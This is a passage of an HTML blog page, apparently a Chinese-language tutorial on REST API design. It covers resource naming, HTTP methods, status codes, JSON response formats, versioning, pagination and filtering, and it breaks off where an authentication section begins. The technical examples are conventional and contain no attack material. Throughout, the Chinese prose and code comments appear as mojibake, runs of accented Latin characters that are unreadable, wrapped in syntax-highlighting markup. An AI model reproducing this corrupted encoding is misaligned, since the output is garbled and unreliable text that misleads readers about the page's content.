class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">èµ„æºè®¾è®¡åŸåˆ™ï¼š<br><br>1. ä½¿ç”¨åè¯ï¼Œä¸ä½¿ç”¨åŠ¨è¯<br>   âœ… å¥½çš„è®¾è®¡:<br>   GET  /users          <span class="hljs-comment"># è·å–ç”¨æˆ·åˆ—è¡¨</span><br>   GET  /users/123      <span class="hljs-comment"># è·å–IDä¸º123çš„ç”¨æˆ·</span><br>   POST /users          <span class="hljs-comment"># åˆ›å»ºæ–°ç”¨æˆ·</span><br><br>   âŒ ä¸å¥½çš„è®¾è®¡:<br>   GET  /getUsers<br>   POST /createUser<br>   GET  /user/delete/123<br><br>2. ä½¿ç”¨å¤æ•°å½¢å¼<br>   âœ… å¥½: /users, /products, /orders<br>   âŒ å·®: /user, /product, /order<br><br>3. ä½¿ç”¨å°å†™å­—æ¯å’Œè¿å­—ç¬¦<br>   âœ… å¥½: /user-profiles, /product-categories<br>   âŒ å·®: /UserProfiles, /product_categories<br><br>4. èµ„æºåµŒå¥—è¡¨ç¤ºå…³ç³»<br>   âœ… å¥½: /users/123/orders        <span class="hljs-comment"># ç”¨æˆ·123çš„è®¢å•</span><br>        /orders/456/items        <span class="hljs-comment"># è®¢å•456çš„å•†å“</span><br><br>   ä½†ä¸è¦åµŒå¥—å¤ªæ·±ï¼ˆæœ€å¤š2-3å±‚ï¼‰<br>   âŒ å·®: /users/123/orders/456/items/789/reviews<br><br>5. ä½¿ç”¨æŸ¥è¯¢å‚æ•°è¿›è¡Œè¿‡æ»¤ã€æ’åºã€åˆ†é¡µ<br>   /users?role=admin              <span class="hljs-comment"># è¿‡æ»¤</span><br>   /users?<span class="hljs-built_in">sort</span>=created_at&amp;order=desc  <span class="hljs-comment"># æ’åº</span><br>   /users?page=2&amp;<span class="hljs-built_in">limit</span>=20         <span class="hljs-comment"># åˆ†é¡µ</span><br>   /users?fields=<span class="hljs-built_in">id</span>,name,email    <span class="hljs-comment"># å­—æ®µé€‰æ‹©</span><br></code></pre></td></tr></table></figure><h3 id="2-2-HTTPæ–¹æ³•ä½¿ç”¨"><a href="#2-2-HTTPæ–¹æ³•ä½¿ç”¨" class="headerlink" title="2.2 HTTPæ–¹æ³•ä½¿ç”¨"></a>2.2 HTTPæ–¹æ³•ä½¿ç”¨</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs gradle">æ ‡å‡†HTTPæ–¹æ³•åŠå…¶ç”¨é€”ï¼š<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æ–¹æ³•   â”‚ ç”¨é€”     â”‚ å®‰å…¨æ€§  â”‚ å¹‚ç­‰æ€§  â”‚ å¯ç¼“å­˜   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ GET    â”‚ è·å–èµ„æº â”‚ æ˜¯      â”‚ æ˜¯      â”‚ æ˜¯       â”‚<br>â”‚ POST   â”‚ åˆ›å»ºèµ„æº â”‚ å¦      â”‚ å¦      â”‚ å¦       â”‚<br>â”‚ PUT    â”‚ æ›´æ–°èµ„æº â”‚ å¦      â”‚ æ˜¯      â”‚ å¦       â”‚<br>â”‚ PATCH  â”‚ éƒ¨åˆ†æ›´æ–° â”‚ å¦      â”‚ å¦      â”‚ å¦       â”‚<br>â”‚ <span class="hljs-keyword">DELETE</span> â”‚ åˆ é™¤èµ„æº â”‚ å¦      â”‚ æ˜¯      â”‚ å¦       â”‚<br>â”‚ HEAD   â”‚ è·å–å¤´éƒ¨ â”‚ æ˜¯      â”‚ æ˜¯      â”‚ æ˜¯       â”‚<br>â”‚ <span class="hljs-keyword">OPTIONS</span>â”‚ è·å–é€‰é¡¹ â”‚ æ˜¯      â”‚ æ˜¯      â”‚ å¦       â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>è¯¦ç»†è¯´æ˜ï¼š<br><br>GET - è·å–èµ„æº<br>  GET /users           â†’ è·å–æ‰€æœ‰ç”¨æˆ·<br>  GET <span class="hljs-regexp">/users/</span><span class="hljs-number">123</span>       â†’ è·å–IDä¸º<span class="hljs-number">123</span>çš„ç”¨æˆ·<br>  ç‰¹ç‚¹ï¼šå®‰å…¨ã€å¹‚ç­‰ã€å¯ç¼“å­˜<br><br>POST - åˆ›å»ºæ–°èµ„æº<br>  POST /users<br>  Body: &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;zhang@example.com&quot;</span>&#125;<br>  ç‰¹ç‚¹ï¼šä¸å®‰å…¨ã€ä¸å¹‚ç­‰<br><br>PUT - å®Œæ•´æ›´æ–°èµ„æº<br>  PUT <span class="hljs-regexp">/users/</span><span class="hljs-number">123</span><br>  Body: &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;new@example.com&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span>&#125;<br>  ç‰¹ç‚¹ï¼šå¹‚ç­‰ï¼ˆå¤šæ¬¡æ‰§è¡Œç»“æœç›¸åŒï¼‰<br>  è¦æ±‚ï¼šå¿…é¡»æä¾›å®Œæ•´çš„èµ„æºæ•°æ®<br><br>PATCH - éƒ¨åˆ†æ›´æ–°èµ„æº<br>  PATCH <span class="hljs-regexp">/users/</span><span class="hljs-number">123</span><br>  Body: &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;new@example.com&quot;</span>&#125;<br>  ç‰¹ç‚¹ï¼šåªæ›´æ–°æä¾›çš„å­—æ®µ<br>  æ›´çµæ´»ï¼Œæ¨èä½¿ç”¨<br><br><span class="hljs-keyword">DELETE</span> - åˆ é™¤èµ„æº<br>  <span class="hljs-keyword">DELETE</span> <span class="hljs-regexp">/users/</span><span class="hljs-number">123</span><br>  ç‰¹ç‚¹ï¼šå¹‚ç­‰ï¼ˆåˆ é™¤å¤šæ¬¡ç»“æœç›¸åŒï¼‰<br><br>HEAD - è·å–èµ„æºå…ƒæ•°æ®<br>  HEAD <span class="hljs-regexp">/users/</span><span class="hljs-number">123</span><br>  è¿”å›ï¼šåªè¿”å›å“åº”å¤´ï¼Œä¸è¿”å›å“åº”ä½“<br>  ç”¨é€”ï¼šæ£€æŸ¥èµ„æºæ˜¯å¦å­˜åœ¨ã€è·å–èµ„æºå¤§å°ç­‰<br><br><span class="hljs-keyword">OPTIONS</span> - è·å–èµ„æºæ”¯æŒçš„æ–¹æ³•<br>  <span class="hljs-keyword">OPTIONS</span> /users<br>  è¿”å›ï¼šAllow: GET, POST, PUT, <span class="hljs-keyword">DELETE</span><br>  ç”¨é€”ï¼šCORSé¢„æ£€è¯·æ±‚<br></code></pre></td></tr></table></figure><h3 id="2-3-çŠ¶æ€ç ä½¿ç”¨"><a href="#2-3-çŠ¶æ€ç ä½¿ç”¨" class="headerlink" title="2.3 çŠ¶æ€ç ä½¿ç”¨"></a>2.3 çŠ¶æ€ç ä½¿ç”¨</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs tap">HTTPçŠ¶æ€ç åˆ†ç±»ï¼š<br><br>1xx - ä¿¡æ¯æ€§<br> <span class="hljs-number"> 100 </span>Continue              <span class="hljs-comment"># ç»§ç»­è¯·æ±‚</span><br><br>2xx - æˆåŠŸ<br> <span class="hljs-number"> 200 </span>OK                    <span class="hljs-comment"># æˆåŠŸï¼ˆGET, PUT, PATCHï¼‰</span><br> <span class="hljs-number"> 201 </span>Created               <span class="hljs-comment"># åˆ›å»ºæˆåŠŸï¼ˆPOSTï¼‰</span><br> <span class="hljs-number"> 202 </span>Accepted              <span class="hljs-comment"># å·²æ¥å—ï¼Œå¤„ç†ä¸­ï¼ˆå¼‚æ­¥æ“ä½œï¼‰</span><br> <span class="hljs-number"> 204 </span>No Content            <span class="hljs-comment"># æˆåŠŸï¼Œæ— è¿”å›å†…å®¹ï¼ˆDELETEï¼‰</span><br><br>3xx - é‡å®šå‘<br> <span class="hljs-number"> 301 </span>Moved Permanently     <span class="hljs-comment"># æ°¸ä¹…é‡å®šå‘</span><br> <span class="hljs-number"> 302 </span>Found                 <span class="hljs-comment"># ä¸´æ—¶é‡å®šå‘</span><br> <span class="hljs-number"> 304 </span>Not Modified          <span class="hljs-comment"># æœªä¿®æ”¹ï¼ˆç¼“å­˜æœ‰æ•ˆï¼‰</span><br><br>4xx - å®¢æˆ·ç«¯é”™è¯¯<br> <span class="hljs-number"> 400 </span>Bad Request           <span class="hljs-comment"># è¯·æ±‚å‚æ•°é”™è¯¯</span><br> <span class="hljs-number"> 401 </span>Unauthorized          <span class="hljs-comment"># æœªè®¤è¯</span><br> <span class="hljs-number"> 403 </span>Forbidden             <span class="hljs-comment"># æ— æƒé™</span><br> <span class="hljs-number"> 404 </span>Not Found             <span class="hljs-comment"># èµ„æºä¸å­˜åœ¨</span><br> <span class="hljs-number"> 405 </span>Method Not Allowed    <span class="hljs-comment"># æ–¹æ³•ä¸å…è®¸</span><br> <span class="hljs-number"> 409 </span>Conflict              <span class="hljs-comment"># èµ„æºå†²çª</span><br> <span class="hljs-number"> 422 </span>Unprocessable Entity  <span class="hljs-comment"># éªŒè¯å¤±è´¥</span><br> <span class="hljs-number"> 429 </span>Too Many Requests     <span class="hljs-comment"># è¯·æ±‚è¿‡å¤š</span><br><br>5xx - æœåŠ¡å™¨é”™è¯¯<br> <span class="hljs-number"> 500 </span>Internal Server Error <span class="hljs-comment"># æœåŠ¡å™¨å†…éƒ¨é”™è¯¯</span><br> <span class="hljs-number"> 502 </span>Bad Gateway           <span class="hljs-comment"># ç½‘å…³é”™è¯¯</span><br> <span class="hljs-number"> 503 </span>Service Unavailable   <span class="hljs-comment"># æœåŠ¡ä¸å¯ç”¨</span><br> <span class="hljs-number"> 504 </span>Gateway Timeout       <span class="hljs-comment"># ç½‘å…³è¶…æ—¶</span><br><br>æœ€å¸¸ç”¨çš„çŠ¶æ€ç ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æ“ä½œ             â”‚ çŠ¶æ€ç                    â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ GETæˆåŠŸ          â”‚<span class="hljs-number"> 200 </span>OK                  â”‚<br>â”‚ POSTåˆ›å»ºæˆåŠŸ     â”‚<span class="hljs-number"> 201 </span>Created             â”‚<br>â”‚ PUT/PATCHæˆåŠŸ    â”‚<span class="hljs-number"> 200 </span>OK                  â”‚<br>â”‚ DELETEæˆåŠŸ       â”‚<span class="hljs-number"> 204 </span>No Content          â”‚<br>â”‚ å‚æ•°é”™è¯¯         â”‚<span class="hljs-number"> 400 </span>Bad Request         â”‚<br>â”‚ æœªç™»å½•           â”‚<span class="hljs-number"> 401 </span>Unauthorized        â”‚<br>â”‚ æ— æƒé™           â”‚<span class="hljs-number"> 403 </span>Forbidden           â”‚<br>â”‚ èµ„æºä¸å­˜åœ¨       â”‚<span class="hljs-number"> 404 </span>Not Found           â”‚<br>â”‚ éªŒè¯å¤±è´¥         â”‚<span class="hljs-number"> 422 </span>Unprocessable Entityâ”‚<br>â”‚ æœåŠ¡å™¨é”™è¯¯       â”‚<span class="hljs-number"> 500 </span>Internal Server Errorâ”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="2-4-å“åº”æ•°æ®æ ¼å¼"><a href="#2-4-å“åº”æ•°æ®æ ¼å¼" class="headerlink" title="2.4 å“åº”æ•°æ®æ ¼å¼"></a>2.4 å“åº”æ•°æ®æ ¼å¼</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs nix">æ ‡å‡†JSONå“åº”æ ¼å¼ï¼š<br><br>æˆåŠŸå“åº”ï¼š<br>&#123;<br>  <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">123</span>,<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>,<br>    <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;zhang@example.com&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;æ“ä½œæˆåŠŸ&quot;</span><br>&#125;<br><br>åˆ—è¡¨å“åº”ï¼ˆå¸¦åˆ†é¡µï¼‰ï¼š<br>&#123;<br>  <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: [<br>    &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;æå››&quot;</span>&#125;<br>  ],<br>  <span class="hljs-string">&quot;pagination&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;total&quot;</span>: <span class="hljs-number">100</span>,<br>    <span class="hljs-string">&quot;page&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-string">&quot;limit&quot;</span>: <span class="hljs-number">20</span>,<br>    <span class="hljs-string">&quot;pages&quot;</span>: <span class="hljs-number">5</span><br>  &#125;,<br>  <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;è·å–æˆåŠŸ&quot;</span><br>&#125;<br><br>é”™è¯¯å“åº”ï¼š<br>&#123;<br>  <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>  <span class="hljs-string">&quot;error&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;VALIDATION_ERROR&quot;</span>,<br>    <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;éªŒè¯å¤±è´¥&quot;</span>,<br>    <span class="hljs-string">&quot;details&quot;</span>: [<br>      &#123;<br>        <span class="hljs-string">&quot;field&quot;</span>: <span class="hljs-string">&quot;email&quot;</span>,<br>        <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;é‚®ç®±æ ¼å¼ä¸æ­£ç¡®&quot;</span><br>      &#125;,<br>      &#123;<br>        <span class="hljs-string">&quot;field&quot;</span>: <span class="hljs-string">&quot;password&quot;</span>,<br>        <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;å¯†ç é•¿åº¦è‡³å°‘8ä½&quot;</span><br>      &#125;<br>    ]<br>  &#125;<br>&#125;<br><br>ç»Ÿä¸€å­—æ®µè¯´æ˜ï¼š<br><span class="hljs-operator">-</span> <span class="hljs-params">status:</span> çŠ¶æ€ï¼ˆsuccess<span class="hljs-operator">/</span>errorï¼‰<br><span class="hljs-operator">-</span> <span class="hljs-params">data:</span> æ•°æ®å†…å®¹<br><span class="hljs-operator">-</span> <span class="hljs-params">message:</span> æç¤ºä¿¡æ¯<br><span class="hljs-operator">-</span> <span class="hljs-params">error:</span> é”™è¯¯è¯¦æƒ…<br><span class="hljs-operator">-</span> <span class="hljs-params">pagination:</span> åˆ†é¡µä¿¡æ¯<br></code></pre></td></tr></table></figure><hr><h2 id="3-é«˜çº§ç‰¹æ€§"><a href="#3-é«˜çº§ç‰¹æ€§" class="headerlink" title="3. é«˜çº§ç‰¹æ€§"></a>3. é«˜çº§ç‰¹æ€§</h2><h3 id="3-1-ç‰ˆæœ¬æ§åˆ¶"><a href="#3-1-ç‰ˆæœ¬æ§åˆ¶" class="headerlink" title="3.1 ç‰ˆæœ¬æ§åˆ¶"></a>3.1 ç‰ˆæœ¬æ§åˆ¶</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs markdown">APIç‰ˆæœ¬æ§åˆ¶çš„ä¸‰ç§æ–¹å¼ï¼š<br><br><span class="hljs-bullet">1.</span> URIç‰ˆæœ¬æ§åˆ¶ï¼ˆæ¨èï¼‰<br>   https://api.example.com/v1/users<br>   https://api.example.com/v2/users<br><br>   ä¼˜ç‚¹ï¼šæ¸…æ™°ã€ç›´è§‚<br>   ç¼ºç‚¹ï¼šURIå˜åŒ–<br><br><span class="hljs-bullet">2.</span> è¯·æ±‚å¤´ç‰ˆæœ¬æ§åˆ¶<br>   GET /users<br>   Headers:<br><span class="hljs-code">     Accept: application/vnd.example.v1+json</span><br><span class="hljs-code"></span><br>   ä¼˜ç‚¹ï¼šURIä¸å˜<br>   ç¼ºç‚¹ï¼šä¸å¤Ÿç›´è§‚<br><br><span class="hljs-bullet">3.</span> å‚æ•°ç‰ˆæœ¬æ§åˆ¶<br>   GET /users?version=1<br><br>   ä¼˜ç‚¹ï¼šç®€å•<br>   ç¼ºç‚¹ï¼šå®¹æ˜“å¿½ç•¥ï¼Œä¸å¤Ÿè§„èŒƒ<br><br>æ¨èåšæ³•ï¼š<br><span class="hljs-bullet">-</span> ä½¿ç”¨URIç‰ˆæœ¬æ§åˆ¶<br><span class="hljs-bullet">-</span> ä¸»ç‰ˆæœ¬å·ï¼ˆv1, v2ï¼‰<br><span class="hljs-bullet">-</span> ä¿æŒå‘åå…¼å®¹<br><span class="hljs-bullet">-</span> æ˜ç¡®åºŸå¼ƒç­–ç•¥<br></code></pre></td></tr></table></figure><h3 id="3-2-åˆ†é¡µã€è¿‡æ»¤ã€æ’åº"><a href="#3-2-åˆ†é¡µã€è¿‡æ»¤ã€æ’åº" class="headerlink" title="3.2 åˆ†é¡µã€è¿‡æ»¤ã€æ’åº"></a>3.2 åˆ†é¡µã€è¿‡æ»¤ã€æ’åº</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">åˆ†é¡µå‚æ•°ï¼š</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?page=2&amp;limit=20</span><br><br><span class="hljs-string">æˆ–ä½¿ç”¨offsetå’Œlimitï¼š</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?offset=20&amp;limit=20</span><br><br><span class="hljs-string">å“åº”åŒ…å«åˆ†é¡µä¿¡æ¯ï¼š</span><br>&#123;<br>  <span class="hljs-attr">&quot;data&quot;:</span> [<span class="hljs-string">...</span>],<br>  <span class="hljs-attr">&quot;pagination&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;total&quot;:</span> <span class="hljs-number">1000</span>,      <span class="hljs-comment"># æ€»è®°å½•æ•°</span><br>    <span class="hljs-attr">&quot;page&quot;:</span> <span class="hljs-number">2</span>,          <span class="hljs-comment"># å½“å‰é¡µ</span><br>    <span class="hljs-attr">&quot;limit&quot;:</span> <span class="hljs-number">20</span>,        <span class="hljs-comment"># æ¯é¡µæ•°é‡</span><br>    <span class="hljs-attr">&quot;pages&quot;:</span> <span class="hljs-number">50</span>,        <span class="hljs-comment"># æ€»é¡µæ•°</span><br>    <span class="hljs-attr">&quot;prev&quot;:</span> <span class="hljs-number">1</span>,          <span class="hljs-comment"># ä¸Šä¸€é¡µ</span><br>    <span class="hljs-attr">&quot;next&quot;:</span> <span class="hljs-number">3</span>           <span class="hljs-comment"># ä¸‹ä¸€é¡µ</span><br>  &#125;<br>&#125;<br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">è¿‡æ»¤å‚æ•°ï¼š</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?role=admin&amp;status=active</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/products?category=electronics&amp;price_min=100&amp;price_max=1000</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/orders?created_after=2024-01-01&amp;created_before=2024-12-31</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">æ’åºå‚æ•°ï¼š</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?sort=created_at&amp;order=desc</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/products?sort=-price</span>  <span class="hljs-comment"># å‡å·è¡¨ç¤ºé™åº</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?sort=name,created_at</span>  <span class="hljs-comment"># å¤šå­—æ®µæ’åº</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">å­—æ®µé€‰æ‹©ï¼ˆç¨€ç–å­—æ®µé›†ï¼‰ï¼š</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?fields=id,name,email</span><br><span class="hljs-string">åªè¿”å›æŒ‡å®šçš„å­—æ®µï¼Œå‡å°‘æ•°æ®ä¼ è¾“</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">æœç´¢ï¼š</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/users?search=å¼ ä¸‰</span><br><span class="hljs-string">GET</span> <span class="hljs-string">/products?q=æ‰‹æœº</span><br></code></pre></td></tr></table></figure><h3 id="3-3-è®¤è¯å’Œæˆæƒ"><a href="#3-3-è®¤è¯å’Œæˆæƒ" class="headerlink" title="3.3 è®¤è¯å’Œæˆæƒ"></a>3.3 è®¤è¯å’Œæˆæƒ</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs nix">å¸¸è§è®¤è¯æ–¹å¼ï¼š<br><br><span class="hljs-number">1</span>. Basic Authï¼ˆåŸºç¡€è®¤è¯ï¼‰<br>   <span class="hljs-params">Authorization:</span> Basic base64(username:password)<br><br>   ä¼˜ç‚¹ï¼šç®€å•<br>   ç¼ºç‚¹ï¼šä¸å¤Ÿå®‰å…¨ï¼ˆéœ€HTTPSï¼‰<br><br><span class="hljs-number">2</span>. API 